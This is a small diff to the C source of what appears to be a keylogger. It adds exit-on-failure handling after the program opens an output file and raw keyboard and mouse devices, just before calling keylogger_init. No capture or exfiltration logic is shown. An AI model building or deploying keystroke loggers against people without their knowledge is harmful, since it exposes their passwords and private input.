@@ -344,18 +344,21 @@ int main(int argc, char **argv)
     if (output_fd < 0)
     {
         perror("output file: open");
+        exit(1);
     }
 
     int keyboard_fd = open(keyboard_device, O_RDONLY);
     if (keyboard_fd < 0)
     {
         perror("keyboard file: open");
+        exit(1);
     }
 
     int mouse_fd = open(mouse_device, O_RDONLY);
     if (mouse_fd < 0)
     {
         perror("mouse file: open");
+        exit(1);
     }
 
     keylogger_init(keyboard_fd, mouse_fd, output_fd);
